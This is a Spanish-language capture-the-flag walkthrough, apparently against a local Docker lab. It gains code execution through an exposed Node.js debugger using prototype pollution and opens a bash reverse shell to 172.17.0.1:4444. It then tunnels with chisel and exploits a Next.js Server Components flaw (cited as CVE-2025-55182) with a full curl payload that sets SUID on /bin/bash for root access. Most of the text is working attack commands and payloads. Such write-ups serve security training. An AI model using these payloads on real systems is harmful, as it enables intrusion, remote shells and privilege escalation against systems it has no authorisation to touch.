## Reconcocimiento:

Puerto 8080: HTTP

Puerto 9229 : Node.js Inspector (debugger)

En la web no hay mucho, asi que me meto al debbuger de una vez:

```bash
node inspect 172.17.0.2:9229
```

Esto confirma que hay una vulnerabilidad llamada Prototype Pollution. Interesa lograr una RCE.

 Utilizo “spam_sync” para invocar “/bin/sh”:

```bash
exec('const spawn = process.binding("spawn_sync"); const result = spawn.spawn({file:"/bin/sh",args:["/bin/sh","-c","id"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}],envPairs:[]}); result.output[1]')
# Info:
Unit8Array(57)
```

Después hay que comprobar si es posible modificar el prototipo global de “Object”:

```bash
exec('Object.prototype.polluted = "yes"; polluted')
# Info:
yes
```

Esta confirmación vuele viable la técnica, aprovechando definimos una función “require” en “Object.prototype” reutilizando “process.mainModule.require”:

```bash
exec('Object.prototype.require = function(m) { return process.mainModule.require(m) }')
```

Con esto ya se pueden ejecutar comandos en el sistema:

```bash
exec('({}).require("child_process").execSync("id").toString()')
```

Confirmo, ahora toca obtener una rev shell:

```bash
exec('({}).require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\'")')
```

## Escalada

```bash
netstat -tuln 
# Info:
127.0.0.1:3000
```

Utilizo chisel para una tunelización y ver que esta corriendo en ese puerto:

https://github.com/jpillora/chisel/releases

Abro un server desde el host:

```bash
python3 -m http.server 80
```

La traigo a la carpeta /tmp con curl y le doy permisos:

```bash
curl -O http://172.17.0.1/chisel
chmod +x chisel
```

Desde el host inicio el servidor:

```bash
./chisel server -p 9000 --reverse
```

Y establezco conexión desde la victima:

```bash
./chisel client 172.17.0.1:9000 R:3001:127.0.0.1:3000
```

Ahora, desde la web accedo:

```bash
http://127.0.0.1:3001/
```

Se trata de un panel de administración basado en tecnologías modernas, aunque a simple vista no expone funcionalidades críticas.

Analizo sus procesos para comprender mejor el entorno:

```bash
ps aux | grep -E "3000|node|npm|next|react"
```

Interesa **Next.js v15.0.0-rc.1**.

La versión detectada de **Next.js (`v15.0.0-rc.1`)** es conocida por ser vulnerable al **CVE-2025-55182**, lo cual puede permitir ejecución de código o escalada de privilegios dependiendo del contexto.

Con el siguiente comando se puede realizar una explotación manual abusando de la lógica interna de Next.js  (Server Components), combinando **Prototype Pollution** con acceso `process.mainModule`, lo que permite ejecutar comandos en el sistema.

```bash
curl -X POST http://localhost:3001/ \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -H "Next-Action: test" \
  -H "Accept: text/x-component" \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'chmod u+s /bin/bash\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
```

Verifico:

```bash
ls -la /bin/bash
# Info:
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Finalmente:

```bash
bash -p
```

Listo.
